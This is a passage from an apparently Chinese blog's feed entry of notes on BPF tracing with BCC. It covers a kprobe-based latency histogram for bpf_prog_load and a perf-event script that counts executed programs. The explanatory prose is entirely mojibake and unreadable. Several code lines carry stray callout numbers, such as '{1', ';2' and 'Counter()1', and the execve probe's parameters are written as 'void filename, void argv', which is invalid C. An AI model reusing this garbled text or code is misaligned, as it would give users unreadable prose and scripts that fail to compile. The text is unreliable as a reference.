è½½BPFç¨‹åºæ‰€å¼•å…¥çš„å»¶è¿Ÿã€‚æˆ‘ä»¬ä½¿ç”¨<code>kprobes</code>æ¥æ”¶é›†è¯¥æŒ‡ä»¤å®Œæˆæ‰€éœ€çš„æ—¶é—´ï¼Œå¹¶å°†ç»“æœç´¯ç§¯åœ¨ä¸€ä¸ªç›´æ–¹å›¾ä¸­ï¼Œç¨åæˆ‘ä»¬å°†å¯¹å…¶è¿›è¡Œå¯è§†åŒ–ã€‚ä¸ºäº†ä¾¿äºç†è§£ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªç¤ºä¾‹åˆ†æˆäº†å‡ ä¸ªéƒ¨åˆ†ã€‚</p><p>ç¬¬ä¸€éƒ¨åˆ†åŒ…æ‹¬äº†BPFç¨‹åºçš„åˆå§‹åŒ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, u64, u64);</span></span><br><span class="line"><span class="string">BPF_HISTOGRAM(histogram);</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_start(void *ctx) &#123;1</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();2</span></span><br><span class="line"><span class="string">  u64 start_time_ns = bpf_ktime_get_ns();</span></span><br><span class="line"><span class="string">  cache.update(&amp;pid, &amp;start_time_ns);3</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1ï¼šä½¿ç”¨å®åˆ›å»ºBPFå“ˆå¸Œæ˜ å°„æ¥å­˜å‚¨è§¦å‘<code>bpf_prog_load</code>æŒ‡ä»¤çš„åˆå§‹æ—¶é—´ã€‚</p><p>2ï¼šä½¿ç”¨æ–°çš„å®åˆ›å»ºBPFç›´æ–¹å›¾ã€‚è¿™ä¸æ˜¯åŸç”ŸBPFæ˜ å°„ï¼›BCCåŒ…å«æ­¤å®ï¼Œä»¥ä¾¿è®©ä½ æ›´è½»æ¾åœ°åˆ›å»ºè¿™äº›å¯è§†åŒ–ã€‚åœ¨åº•å±‚ï¼Œè¿™ä¸ªBPFç›´æ–¹å›¾ä½¿ç”¨æ•°ç»„æ˜ å°„æ¥å­˜å‚¨ä¿¡æ¯ã€‚å®ƒè¿˜æœ‰å‡ ä¸ªåŠ©æ‰‹æ¥è¿›è¡Œåˆ†æ¡¶å¹¶åˆ›å»ºæœ€ç»ˆå›¾ã€‚</p><p>3ï¼šå½“åº”ç”¨ç¨‹åºè§¦å‘æˆ‘ä»¬è¦è·Ÿè¸ªçš„æŒ‡ä»¤æ—¶ï¼Œä½¿ç”¨ç¨‹åº PID æ¥å­˜å‚¨ã€‚</p><p>è®©æˆ‘ä»¬çœ‹çœ‹æˆ‘ä»¬å¦‚ä½•è®¡ç®—å»¶è¿Ÿçš„å¢é‡å¹¶å°†å…¶å­˜å‚¨åœ¨æˆ‘ä»¬çš„ç›´æ–¹å›¾ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_return(void *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 *start_time_ns, delta;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  start_time_ns = cache.lookup(&amp;pid);</span></span><br><span class="line"><span class="string">  if (start_time_ns == 0)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  delta = bpf_ktime_get_ns() - *start_time_ns;1</span></span><br><span class="line"><span class="string">  histogram.increment(bpf_log2l(delta));2</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1ï¼šè®¡ç®—æŒ‡ä»¤è¢«è°ƒç”¨çš„æ—¶é—´å’Œæˆ‘ä»¬çš„ç¨‹åºåˆ°è¾¾è¿™é‡Œçš„æ—¶é—´ä¹‹é—´çš„å¢é‡ï¼› æˆ‘ä»¬å¯ä»¥å‡è®¾è¿™ä¹Ÿæ˜¯æŒ‡ä»¤å®Œæˆçš„æ—¶é—´ã€‚</p><p>2ï¼šå°†è¯¥å¢é‡å­˜å‚¨åœ¨æˆ‘ä»¬çš„ç›´æ–¹å›¾ä¸­ã€‚æˆ‘ä»¬åœ¨è¿™æ¡çº¿ä¸Šåšäº†ä¸¤ä¸ªæ“ä½œã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨å†…ç½®å‡½æ•°<code>bpf_log2l</code>ä¸º <code>delta</code>çš„å€¼ç”Ÿæˆæ¡¶æ ‡è¯†ç¬¦ã€‚æ­¤åŠŸèƒ½ä¼šéšç€æ—¶é—´çš„æ¨ç§»åˆ›å»ºç¨³å®šçš„å€¼åˆ†å¸ƒã€‚ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨å¢é‡å‡½æ•°å‘è¿™ä¸ªæ¡¶ä¸­æ·»åŠ ä¸€ä¸ªæ–°é¡¹ç›®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœç›´æ–¹å›¾ä¸­å­˜åœ¨<code>bucket</code>ï¼Œåˆ™<code>increment</code>ä¼šå°†è¯¥å€¼åŠ 1ï¼Œå¦åˆ™ä¼šå¯åŠ¨ä¸€ä¸ªå€¼ä¸º1çš„æ–°bucketï¼Œå› æ­¤æ— éœ€æ‹…å¿ƒè¯¥å€¼æ˜¯å¦å­˜åœ¨ã€‚</p><p>æˆ‘ä»¬éœ€è¦ç¼–å†™çš„æœ€åä¸€æ®µä»£ç å°†è¿™ä¸¤ä¸ªå‡½æ•°é™„åŠ åˆ°æœ‰æ•ˆçš„<code>kprobe</code>ä¸Šï¼Œå¹¶åœ¨å±å¹•ä¸Šæ‰“å°ç›´æ–¹å›¾ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å»¶è¿Ÿåˆ†å¸ƒã€‚è¿™éƒ¨åˆ†æ˜¯æˆ‘ä»¬åˆå§‹åŒ–BPFç¨‹åºå¹¶ç­‰å¾…äº‹ä»¶ç”Ÿæˆç›´æ–¹å›¾çš„åœ°æ–¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_kprobe(event=<span class="string">"bpf_prog_load"</span>, fn_name=<span class="string">"trace_bpf_prog_load_start"</span>)</span><br><span class="line">bpf.attach_kretprobe(event=<span class="string">"bpf_prog_load"</span>,</span><br><span class="line">                     fn_name=<span class="string">"trace_bpf_prog_load_return"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"histogram"</span>].print_log2_hist(<span class="string">"msecs"</span>)</span><br></pre></td></tr></table></figure><p>æ­£å¦‚æˆ‘ä»¬åœ¨æœ¬èŠ‚å¼€å¤´æåˆ°çš„ï¼Œç›´æ–¹å›¾å¯ç”¨äºè§‚å¯Ÿç³»ç»Ÿä¸­çš„å¼‚å¸¸æƒ…å†µã€‚BCCå·¥å…·åŒ…æ‹¬è®¸å¤šä½¿ç”¨ç›´æ–¹å›¾è¡¨ç¤ºæ•°æ®çš„è„šæœ¬ã€‚éœ€è¦æ·±å…¥äº†è§£ç³»ç»Ÿæ—¶å¯ä»¥æŸ¥çœ‹å®ƒä»¬ã€‚</p><p><code>histogram.py</code>å®Œæ•´ä»£ç å¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signal_ignore</span><span class="params">(signal, frame)</span>:</span></span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, u64, u64);</span></span><br><span class="line"><span class="string">BPF_HISTOGRAM(histogram);</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_start(void *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  u64 start_time_ns = bpf_ktime_get_ns();</span></span><br><span class="line"><span class="string">  cache.update(&amp;pid, &amp;start_time_ns);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load_return(void *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 *start_time_ns, delta;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  start_time_ns = cache.lookup(&amp;pid);</span></span><br><span class="line"><span class="string">  if (start_time_ns == 0)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  delta = bpf_ktime_get_ns() - *start_time_ns;</span></span><br><span class="line"><span class="string">  histogram.increment(bpf_log2l(delta));</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_kprobe(event=<span class="string">"bpf_prog_load"</span>, fn_name=<span class="string">"trace_bpf_prog_load_start"</span>)</span><br><span class="line">bpf.attach_kretprobe(event=<span class="string">"bpf_prog_load"</span>,</span><br><span class="line">                     fn_name=<span class="string">"trace_bpf_prog_load_return"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"histogram"</span>].print_log2_hist(<span class="string">"msecs"</span>)</span><br></pre></td></tr></table></figure><h4 id="Perf-Events"><a href="#Perf-Events" class="headerlink" title="Perf Events"></a>Perf Events</h4><p>æˆ‘ä»¬ç›¸ä¿¡<code>Perf</code>äº‹ä»¶å¯èƒ½æ˜¯æˆåŠŸä½¿ç”¨BPFè·Ÿè¸ªæ‰€éœ€æŒæ¡çš„æœ€é‡è¦çš„é€šä¿¡æ–¹æ³•ã€‚æˆ‘ä»¬åœ¨å‰ä¸€ç« ä¸­è®¨è®ºäº†<code>BPF Perf</code>äº‹ä»¶æ•°ç»„æ˜ å°„ã€‚å®ƒä»¬å…è®¸ä½ å°†æ•°æ®æ”¾å…¥ä¸ç”¨æˆ·ç©ºé—´ç¨‹åºå®æ—¶åŒæ­¥çš„ç¯å½¢ç¼“å†²åŒºä¸­ã€‚å½“ä½ åœ¨BPFç¨‹åºä¸­æ”¶é›†å¤§é‡æ•°æ®ï¼Œå¹¶å¸Œæœ›å°†å¤„ç†å¯è§†åŒ–å·¥ä½œè½¬ç§»åˆ°ç”¨æˆ·ç©ºé—´ç¨‹åºæ—¶ï¼Œè¿™æ˜¯ä¸€ä¸ªç†æƒ³çš„é€‰æ‹©ã€‚è¿™å°†å…è®¸ä½ å¯¹è¡¨ç¤ºå±‚è¿›è¡Œæ›´å¤šæ§åˆ¶ï¼Œå› ä¸ºåœ¨ç¼–ç¨‹èƒ½åŠ›æ–¹é¢ä¸å—BPFè™šæ‹Ÿæœºçš„é™åˆ¶ã€‚ä½ å¯ä»¥æ‰¾åˆ°çš„å¤§å¤šæ•°BPFè·Ÿè¸ªç¨‹åºçš„ç›®çš„æ˜¯ä½¿ç”¨<code>Perf</code>äº‹ä»¶ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•ä½¿ç”¨å®ƒä»¬æå–æœ‰å…³äºŒè¿›åˆ¶æ‰§è¡Œçš„ä¿¡æ¯ï¼Œå¹¶å¯¹è¿™äº›ä¿¡æ¯è¿›è¡Œåˆ†ç±»ï¼Œä»¥æ‰“å°ç³»ç»Ÿä¸­æ‰§è¡Œæœ€å¤šçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æˆ‘ä»¬å·²å°†æ­¤ç¤ºä¾‹åˆ†ä¸ºä¸¤ä¸ªä»£ç å—ï¼Œä»¥ä¾¿ä½ å¯ä»¥è½»æ¾åœ°äº†è§£æ­¤ç¤ºä¾‹ã€‚åœ¨ç¬¬ä¸€å—ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰BPFç¨‹åºå¹¶å°†å…¶é™„åŠ åˆ°<code>kprobe</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_PERF_OUTPUT(events);1</span></span><br><span class="line"><span class="string">int do_sys_execve(struct pt_regs *ctx, void filename, void argv, void envp) &#123;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  events.perf_submit(ctx, &amp;comm, sizeof(comm));2</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">bpf = BPF(text = bpf_source)<span class="number">3</span></span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)</span><br><span class="line">bpf.attach_kprobe(event = execve_function, fn_name = <span class="string">"do_sys_execve"</span>)</span><br></pre></td></tr></table></figure><p>1ï¼šä½¿ç”¨<code>BPF_PERF_OUTPUT</code>è¾“å‡ºå£°æ˜<code>Perf</code>äº‹ä»¶æ˜ å°„ã€‚è¿™æ˜¯BCCæä¾›çš„ç”¨äºå£°æ˜æ­¤ç±»æ˜ å°„çš„å®ã€‚æˆ‘ä»¬å°†æ­¤æ˜ å°„å‘½åä¸º<code>events</code>ã€‚</p><p>2ï¼šåœ¨è·å¾—å†…æ ¸æ‰§è¡Œçš„ç¨‹åºçš„åç§°åï¼Œå°†å…¶å‘é€åˆ°ç”¨æˆ·ç©ºé—´è¿›è¡Œèšåˆã€‚æˆ‘ä»¬ä½¿ç”¨<code>perf_submit</code>æ¥å®ç°è¿™ä¸€ç‚¹ã€‚æ­¤å‡½æ•°ä½¿ç”¨æˆ‘ä»¬çš„æ–°ä¿¡æ¯æ›´æ–°<code>Perf events</code>æ˜ å°„ã€‚</p><p>3ï¼šåˆå§‹åŒ–BPFç¨‹åºå¹¶å°†å…¶é™„ç€åˆ°<code>kprobe</code>ï¼Œä»¥ä¾¿åœ¨ç³»ç»Ÿä¸­æ‰§è¡Œæ–°ç¨‹åºæ—¶è§¦å‘ã€‚</p><p>ç°åœ¨æˆ‘ä»¬å·²ç»ç¼–å†™äº†æ”¶é›†ç³»ç»Ÿä¸­æ‰§è¡Œçš„æ‰€æœ‰ç¨‹åºçš„ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç”¨æˆ·ç©ºé—´ä¸­èšåˆå®ƒä»¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">aggregates = Counter()<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aggregate_programs</span><span class="params">(cpu, data, size)</span>:</span><span class="number">2</span></span><br><span class="line">  comm = bpf[<span class="string">"events"</span>].event(data)<span class="number">3</span></span><br><span class="line">  aggregates[comm] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"events"</span>].open_perf_buffer(aggregate_programs)<span class="number">4</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      bpf.perf_buffer_poll()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:<span class="number">5</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (comm, times) <span class="keyword">in</span> aggregates.most_common(): </span><br><span class="line">  print(<span class="string">"Program &#123;&#125; executed &#123;&#125; times"</span>.format(comm, times))</span><br></pre></td></tr></table></figure><p>1ï¼šå£°æ˜ä¸€ä¸ªè®¡æ•°å™¨æ¥å­˜å‚¨æˆ‘ä»¬çš„ç¨‹åºä¿¡æ¯ã€‚æˆ‘ä»¬ä½¿ç”¨ç¨‹åºçš„åç§°ä½œä¸ºé”®ï¼Œå€¼å°†æ˜¯è®¡æ•°å™¨ã€‚æˆ‘ä»¬ä½¿ç”¨<code>aggregate_ programs</code>å‡½æ•°ä»<code>Perf</code>äº‹ä»¶æ˜ å°„ä¸­æ”¶é›†æ•°æ®ã€‚åœ¨æœ¬ä¾‹ä¸­å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¦‚ä½•ä½¿ç”¨BCCå®è®¿é—®æ˜ å°„å¹¶ä»å †æ ˆé¡¶éƒ¨æå–ä¸‹ä¸€ä¸ªä¼ å…¥æ•°æ®äº‹ä»¶ã€‚</p><p>2ï¼šå¢åŠ æˆ‘ä»¬æ”¶åˆ°å…·æœ‰ç›¸åŒç¨‹åºåç§°çš„äº‹ä»¶çš„æ¬¡æ•°ã€‚</p><p>3ï¼šä½¿ç”¨å‡½æ•°<code>open_perf_buffer</code>å‘Šè¯‰BCCï¼Œæ¯æ¬¡ä»<code>Perf events</code>æ˜ å°„æ¥æ”¶åˆ°äº‹ä»¶æ—¶ï¼Œå®ƒéƒ½éœ€è¦æ‰§è¡Œ<code>aggregate</code>å‡½æ•°ç¨‹åºã€‚</p><p>4ï¼šBCCåœ¨æ‰“å¼€ç¯å½¢ç¼“å†²åŒºåè½®è¯¢äº‹ä»¶ï¼Œç›´åˆ°æˆ‘ä»¬ä¸­æ–­æ­¤Pythonç¨‹åºã€‚ç­‰å¾…çš„æ—¶é—´è¶Šé•¿ï¼Œå¤„ç†çš„ä¿¡æ¯å°±è¶Šå¤šã€‚å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¦‚ä½•ä½¿ç”¨<code>perf_buffer_poll</code></p><p>5ï¼šä½¿ç”¨<code>most_common</code>å‡½æ•°è·å–è®¡æ•°å™¨å’Œå¾ªç¯ä¸­çš„å…ƒç´ åˆ—è¡¨ï¼Œä»¥æ‰“å°ç³»ç»Ÿä¸­æ‰§è¡Œæ¬¡æ•°æœ€å¤šçš„ç¨‹åºã€‚</p><p><code>perf_events.py</code>å®Œæ•´ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">BPF_PERF_OUTPUT(events);</span></span><br><span class="line"><span class="string">int do_sys_execve(struct pt_regs *ctx, void filename, void argv, void envp) &#123;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  events.perf_submit(ctx, &amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)</span><br><span class="line">bpf.attach_kprobe(event = execve_function, fn_name = <span class="string">"do_sys_execve"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">aggregates = Counter()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aggregate_programs</span><span class="params">(cpu, data, size)</span>:</span></span><br><span class="line">  comm = bpf[<span class="string">"events"</span>].event(data)</span><br><span class="line">  aggregates[comm] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">bpf[<span class="string">"events"</span>].open_perf_buffer(aggregate_programs)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      bpf.perf_buffer_poll()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (comm, times) <span class="keyword">in</span> aggregates.most_common(): </span><br><span class="line">  print(<span class="string">"Program &#123;&#125; executed &#123;&#125; times"</span>.format(comm, times))</span><br></pre></td></tr></table></figure><h3 id="ç»“è®º-2"><a href="#ç»“è®º-2" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>åœ¨æœ¬ç« ä¸­ï¼Œæˆ‘ä»¬åªè§¦åŠäº†ä½¿ç”¨BPFè¿›è¡Œè·Ÿè¸ªçš„è¡¨é¢ã€‚Linuxå†…æ ¸å…è®¸æ‚¨è®¿é—®å…¶ä»–å·¥å…·æ›´éš¾ä»¥è·å–çš„ä¿¡æ¯ã€‚BPFä½¿æ­¤è¿‡ç¨‹æ›´å…·å¯é¢„æµ‹æ€§ï¼Œå› ä¸ºå®ƒæä¾›äº†è®¿é—®æ­¤æ•°æ®çš„å…¬å…±æ¥å£ã€‚åœ¨åé¢çš„ç« èŠ‚ä¸­ï¼Œæ‚¨å°†çœ‹åˆ°æ›´å¤šä½¿ç”¨æ­¤å¤„æè¿°çš„ä¸€äº›æŠ€æœ¯çš„ç¤ºä¾‹ï¼Œä¾‹å¦‚å°†å‡½æ•°é™„ç€åˆ°è·Ÿè¸ªç‚¹ã€‚</p><p>åœ¨ä¸‹ä¸€ç« ä¸­ï¼Œæˆ‘ä»¬å°†å±•ç¤ºç³»ç»Ÿç¤¾åŒºåœ¨BPFåŸºç¡€ä¸Šæ„å»ºçš„ä¸€äº›å·¥å…·ï¼Œç”¨äºè¿›è¡Œæ€§èƒ½åˆ†æå’Œè·Ÿè¸ªã€‚è¿™äº›ä¸“ç”¨å·¥å…·å¯ä»¥è®©ä½ è®¿é—®æˆ‘ä»¬çœ‹åˆ°çš„æ‰“åŒ…æ ¼å¼çš„å¤§éƒ¨åˆ†ä¿¡æ¯ã€‚è¿™æ ·ä½ å°±ä¸éœ€è¦é‡å†™å·²ç»å­˜åœ¨çš„å·¥å…·ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ç¬¬ä¸€ç« èŠ‚&quot;&gt;&lt;a href=&quot;#ç¬¬ä¸€ç« èŠ‚&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬ä¸€ç« èŠ‚&quot;&gt;&lt;/a&gt;ç¬¬ä¸€ç« èŠ‚&lt;/h2&gt;&lt;h3 id=&quot;å¼•è¨€&quot;&gt;&lt;a href=&quot;#å¼•è¨€&quot; class=&quot;headerlink&quot; title=&quot;å¼•è¨€&quot;&gt;&lt;/a&gt;å¼•è¨€&lt;/h
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
</feed>
